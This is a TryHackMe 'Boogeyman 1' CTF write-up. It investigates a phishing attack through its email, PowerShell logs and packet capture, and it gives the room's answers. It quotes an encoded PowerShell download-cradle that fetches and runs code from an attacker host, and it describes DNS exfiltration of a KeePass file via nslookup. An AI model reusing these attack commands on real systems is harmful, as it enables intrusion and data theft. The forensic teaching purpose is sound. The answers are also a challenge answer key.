# Boogeyman 1 Write-Up

## **Introduction**
**📊 Difficulty**: Medium

Link to the room : https://tryhackme.com/room/boogeyman1

Boogeyman 1 is the first of three rooms in the Boogeyman series on [TryHackMe](https://tryhackme.com). It is part of the SOC Level 1 Capstone Challenges module and is designed to test and demonstrate the various skills developed throughout the [SOC Level 1](https://tryhackme.com/path/outline/soclevel1) Learning Path.

---

## **Context**


In this room, our objective is to analyze the tactics, techniques, and procedures (TTPs) used by a newly identified threat group known as Boogeyman. This group successfully exfiltrated sensitive data through a malicious attachment delivered via a Business Email Compromise (BEC) attack.

The room provides us with several artifacts including a copy of the phishing email, Powershell logs and a packet capture from the victim’s machine.

<img width="1062" height="114" alt="Capture d'écran 2025-08-05 161411" src="https://github.com/user-attachments/assets/7f0a6f6b-83fb-4d95-bcac-7ac686dff33c" />

To carry out our analysis, we have the following tools at our disposal:

*Thunderbird* - a free and open-source cross-platform email client.

*LNKParse3* - a python package for forensics of a binary file with LNK extension.

*Wireshark* - GUI-based packet analyser.

*Tshark* - CLI-based Wireshark. 

*jq* - a lightweight and flexible command-line JSON processor.

---

## **Part I : Email Analysis**


>_“Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation._
>
>_The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector._
>
>_You are tasked to analyse and assess the impact of the compromise.”_

Let’s first start by taking a look at the email Julianne received by opening `dump.eml` with Thunderbird.

<img width="1524" height="761" alt="Capture d'écran 2025-08-05 161808" src="https://github.com/user-attachments/assets/066f6637-2ceb-4cf7-ad6e-42f12169e6cf" />

From what we can see, Julianne Westcott (julianne.westcott@hotmail.com) received an email with the subject _“Collection for Quick Logistics LLC - Jan 2023”_ with an attachment named _“Invoice.zip”_ from Arthur Griffin (agriffin@bpakcaging.xyz). The attachment seem to be encrypted and require a password to be viewed, which is provided in the email as **“Invoice2023!”**

### **Q. What is the email address used to send the phishing email?**

**Answer** : agriffin@bpakcaging.xyz

### **Q. What is the email address of the victim?**

**Answer** : julianne.westcott@hotmail.com

### **Q. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?**

To answer this question, we need to view the raw email message by clicking on `More > View Source`.

Scrolling a bit, we can view the `DKIM-Signature` and `List-Unsubscribe` headers and find the answer to the question. 

<img width="866" height="244" alt="Capture d'écran 2025-08-05 162819" src="https://github.com/user-attachments/assets/3703882d-7799-4bf1-9101-f0f572c95f69" />
<img width="924" height="94" alt="Capture d'écran 2025-08-05 162906" src="https://github.com/user-attachments/assets/40f0570a-75e7-46d1-9a46-7d6f91f74626" />

**Answer** : elasticemail.com

### **Q. What is the name of the file inside the encrypted attachment?**

**Answer** : Invoice.zip

### **Q. What is the password of the encrypted attachment?**

**Answer** : Invoice2023!

### **Q. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?**

To answer this question, we first need to download the attachment **Invoice.zip**, extract it using the password provided in the email (**Invoice2023!**). This reveals the file **Invoice_20230103.lnk**, which we can then analyze using `lnkparse`.

<img width="532" height="89" alt="Capture d'écran 2025-08-05 163747" src="https://github.com/user-attachments/assets/02b2e81d-ea38-487f-8255-cbdfacae63d2" />

<img width="1511" height="750" alt="Capture d'écran 2025-08-05 164206" src="https://github.com/user-attachments/assets/894eed71-ee3c-49e8-9c40-8d6e1c6426b4" />

Scrolling down, we find the Command Line Arguments.

**Answer** : aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

The string found looks like Base64. By pasting it on CyberChef, we can decrypt the string :  

<img width="1536" height="517" alt="Capture d'écran 2025-08-05 164625" src="https://github.com/user-attachments/assets/9172b458-d426-4dd7-b2a3-017716e23957" />

It translates to : _iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')_

We can conclude that a PowerShell command is executed when the file is opened.

---

## **Part II : Endpoint Security**

In this part, we are tasked to analyse the PowerShell logs for signs of intrusion. 

We are provided with the `jq` tool to assist in our analysis.

Per Tryhackme, _“﻿jq is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands.”_

Let’s take a first look at the logs.

<img width="868" height="383" alt="Capture d'écran 2025-08-05 165228" src="https://github.com/user-attachments/assets/eeaea09d-f5a6-4f37-acd4-a8be64c4190b" />

Parsing through the logs, we quickly understand that the field of interest is `ScriptBlockText`. So let’s filter out the other fields. 

<img width="1156" height="448" alt="Capture d'écran 2025-08-05 165443" src="https://github.com/user-attachments/assets/0a519df2-ff9d-4c53-8a83-f074e01c1688" />

Much of the output is irrelevant to our analysis, so we'll refine our filtering even further based on the current output : we can filter out all `ScriptBlockText = null`, `ScriptBlockText = Set-StrictMode [...]`.

<img width="1513" height="365" alt="Capture d'écran 2025-08-05 165900" src="https://github.com/user-attachments/assets/34b651cd-1395-4a46-bf15-6a31c62c4364" />


### **Q. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)**

At the end of the first part of this room, we found which command was ran upon execution of the malicious attachment. The command mentioned a certain website which domain is **bpakcaging**. By filtering out all lines containing this domain, we obtain the following output. 
 
<img width="1505" height="254" alt="Capture d'écran 2025-08-05 171000" src="https://github.com/user-attachments/assets/f5d6f689-3268-4ff1-91e9-7d3583cf275c" />

We find two domains that coul have been used by the attacker.

**Answer** : cdn.bpakcaging.xyz, files.bpakcaging.xyz

### **Q.What is the name of the enumeration tool downloaded by the attacker?**

Parsing through the `ScriptBlockTexts`, we find an executable named `sb.exe` which appears multiple times. I tried entering that as the answer to the question, but it seems a different response is required. However, another executable appears, which seems to reveal the full name of `sb.exe`.

<img width="1371" height="219" alt="Capture d'écran 2025-08-05 174417" src="https://github.com/user-attachments/assets/99e6d58d-de9a-4c5a-b065-71a462dab413" />

**Answer** : Seatbelt.exe

### **Q. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.**

As observed in the previous questions, there is evidence of local navigation by the attacker on the victim machine, indicated by the presence of `cd` commands. Let’s reconstruct the order of events in chronological order with the following command. 

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' | grep -Ev 'Set-StrictMode|null' | grep -z cd
```

<img width="1558" height="562" alt="Capture d'écran 2025-08-10 194534" src="https://github.com/user-attachments/assets/409e3e42-4813-41ba-b790-dc7aa58086f2" />

Following the cd commands, we can see that the attacker navigated through the `C:\` directory, then to `Users`, `j.westcottv`, `Appdata`, `Local`, `Packages`. The attacker then executes `sq3.exe`, located in the `Music\` directory. I did some research on the executable and found that it was probably a SQLite tool used for reading `plum.sqlite` content, which is the file where Microsoft Sticky Notes stores data.

We can conclude that the attacker initially downloaded `Seatbelt.exe` from http://files.bpakcaging.xyz/sb.exe using the `Invoke-WebRequest` cmdlet and used it to enumerate files on the victim’s machine. Having found the file they were looking for, they used the same method to retrieve `sq3.exe` from http://files.bpakcaging.xyz/sq3.exe and employed it to extract data from the `plum.sqlite` file.


**Answer** : C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

### **Q. What is the software that uses the file in Q3?**

**Answer** : Microsoft Sticky Notes

### **Q. What is the name of the exfiltrated file?**

From the same output referenced earlier, we can clearly see that the attacker exfiltrated the file `protected_data.kdbx` by reading its contents in binary. They then converted the data to hexadecimal format, and transmitted it to the IP address `167.71.211.113` in group of 50 bytes using `nslookup`.

<img width="1511" height="250" alt="Capture d'écran 2025-08-10 200535" src="https://github.com/user-attachments/assets/932f153c-8831-479e-ac03-7a24450cacbd" />

**Answer** : protected_data.kdbx

### **Q. What type of file uses the .kdbx file extension?**

After a simple web search, we find that the .kdbx extension is used by a password manager named Keepass.

**Answer** : Keepass

### **Q. What is the encoding used during the exfiltration attempt of the sensitive file?**

**Answer** : Hex

### **Q. What is the tool used for exfiltration?**

**Answer** : nslookup

--- 

## **Part III : Network Traffic Analysis**

For this part, we will be using the provided packet capture file and read it using Wireshark and Tshark.

### Q.What software is used by the attacker to host its presumed file/payload server?

I decided to filter the capture by the IP address previously found, which was used by the attacker to receive the extracted files. By doing that, we find `HTTP` packets, including one with the name of the software used to host the server.

<img width="1896" height="632" alt="Capture d'écran 2025-08-11 162928" src="https://github.com/user-attachments/assets/4c443221-91bb-4408-8f42-0f8268d2a876" />


The information could also have been found by following the HTTP stream.
<img width="1245" height="402" alt="Capture d'écran 2025-08-11 163107" src="https://github.com/user-attachments/assets/84a6a896-5099-4f9b-a147-6b4ccf7c6851" />


**Answer** : Python

### Q.What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Although we could guess the answer to this question (which i did), we should still find evidence of it. 

By applying the following filter, we can observe that the victim’s machine sent several packets to the IP address `159.89.205.40` using the `POST` HTTP method. When I first did this room, that was enough evidence for me to validate my answers. 

<img width="1752" height="538" alt="Capture d'écran 2025-08-11 164558" src="https://github.com/user-attachments/assets/02bee5b3-8bba-4017-a1e9-987e452b4f4f" />

However, I since did a bit of digging and found that we could go even further in our investigation.

In fact, by looking at the content of the previously mentioned packets, we can see the C2 server mentioned as the `Host`, and Windows Powershell as the `User-Agent`. Therefore, we can safely deduce that POST method is being used for the output of the commands executed by the attacker.

<img width="1858" height="497" alt="Capture d'écran 2025-08-11 164644" src="https://github.com/user-attachments/assets/154903c1-74fe-46af-96a8-bf1f2964117f" />


### Q. What is the protocol used during the exfiltration activity?

Again, from the previous part, we know that the content of the `protected_data.kdbx` file were sent over to the IP address `167.71.211.113` by groups of 50 bytes. By filtering the packet capture to only display packets sent to the mentioned IP address, we find a number of **DNS** packets, many of which containing 50 bytes long messages.

<img width="1854" height="644" alt="Capture d'écran 2025-08-11 165414" src="https://github.com/user-attachments/assets/0676fa7d-8d41-4a31-99d7-b7c5889b49a3" />

I didn’t think of it back then, but from the previous part, we also know that the attacker used `nslookup` to exfiltrate the data, which was a first hint as to which protocol was used.

**Answer** : DNS

### Q. What is the password of the exfiltrated file?

We know that the attacker used `sq3.exe` to read the content of Microsoft Sticky Notes. We can guess that it is in said sticky notes that the password to the file was saved. So let’s find what `sq3.exe` found with the following filter and following the TCP stream : 

<img width="1524" height="726" alt="Capture d'écran 2025-08-11 172236" src="https://github.com/user-attachments/assets/1e705838-dc25-4768-94eb-fdbead387b19" />

We can view the response to the previous request by going to the following stream (number 750).

<img width="1275" height="802" alt="Capture d'écran 2025-08-11 172258" src="https://github.com/user-attachments/assets/c21140f8-0977-4e15-a9d7-3f0c6de4c1f1" />

We obtain a series of numbers which I guessed could be decimal encryption. Pasting the content to Cyberchef and applying the From Decimal receipt, we obtain the Master Password of the exfiltrated file.
<img width="1534" height="834" alt="Capture d'écran 2025-08-11 172403" src="https://github.com/user-attachments/assets/ed71af7b-a010-49ae-a20a-ac1f906079cc" />


**Answer** : %p9^3!lL^Mz47E2GaT^y

### Q. What is the credit card number stored inside the exfiltrated file?

To rebuild the exfiltrated file, we need to reassemble all the packets received by `167.71.211.113`. At first, I considered doing this manually, but I quickly realized the overwhelming number of packets made that impractical.
A simpler way to merge packet contents from a capture is to use Wireshark’s command-line counterpart: **Tshark**.
Reading the packet capture with tshark, we can filter the output to match our needs.

```bash
tshark -r capture.pcapng -Y "ip.dst == 167.71.211.113 && dns"
```
<img width="1510" height="831" alt="Capture d'écran 2025-08-11 170741" src="https://github.com/user-attachments/assets/192cced3-d479-4683-a8bc-725b8bbc867b" />

This command outputs all DNS packets sent to `167.71.211.113`. As we can see, some of those packets don’t contain the information we are looking for. Therefore, further filtering is needed. We can observe that the bytes segments are followed by bpakcaging.xyz. We can use that as a filter.

```bash
tshark -r capture.pcapng -Y "ip.dst == 167.71.211.113 && dns" | grep bpakcaging
```

Now that we’ve filtered the packets containing the file’s data, the next step is to extract that data. This can be done using the `cut` command, specifying the appropriate delimiters.

```bash
tshark -r capture.pcapng -Y "ip.dst == 167.71.211.113 && dns" | grep bpakcaging | cut -d " " -f 12 | cut -d "." -f 1
```
<img width="1100" height="825" alt="Capture d'écran 2025-08-11 171044" src="https://github.com/user-attachments/assets/5be4c6d5-569c-4078-865b-8c766e748077" />

I noticed that some packets were duplicates. I easily fixed that using the `uniq` command.

<img width="889" height="835" alt="Capture d'écran 2025-08-11 171151" src="https://github.com/user-attachments/assets/3fafe5d1-376d-4cec-98dc-008316ea5d3a" />


Great ! The final step is to join the lines by removing the invisible `\n` characters, then output the resulting data.

```bash
tshark -r capture.pacap -Y "ip.dst == 167.71.211.113 && dns" | grep bpakcaging | cut -d " " -f 12 | cut -d "." -f 1 | uniq | tr -d '\n' > protected_data.kdbx
```

<img width="1512" height="819" alt="Capture d'écran 2025-08-11 171735" src="https://github.com/user-attachments/assets/eac9cc77-f79f-4548-ada7-e751d99a1446" />


We know from the previous part that the attacker encrypted the data in hexadecimal format. We can decrypt the previously obtained output using Cyberchef, or directly from the command line using `xxd`. 

As I never used `xxd` before, I wanted to try it out.

```bash
cat protected_data.kdbx | xxd -r -p > protected_data2.kdbx
```
The `-r` flag means that we want to decrypt from hex.
The `-p` flag indicates that we want the output to be in plain format.

Now, all we have to do is open the obtained decrypted file using the password from the previous question. 

<img width="964" height="443" alt="Capture d'écran 2025-08-11 172447" src="https://github.com/user-attachments/assets/0928aa29-e22a-46ca-8c46-694c6753f965" />
<img width="1093" height="253" alt="Capture d'écran 2025-08-11 174253" src="https://github.com/user-attachments/assets/c5194925-1339-4c8e-8c49-e510038d51e1" />

**Answer** : 4024007128269551

## **Conclusion**

That was a tough room but a fun one nonetheless. The questions themselves weren’t particularly difficult, yet tracking down the answers still took me some time, even when I had an idea of how to approach them. 

Although I was familiar with all the tools used throughout this room, I had yet to put them to use in a real-world scenario. 

This room allowed me to do just that and reinforce my understanding of them.
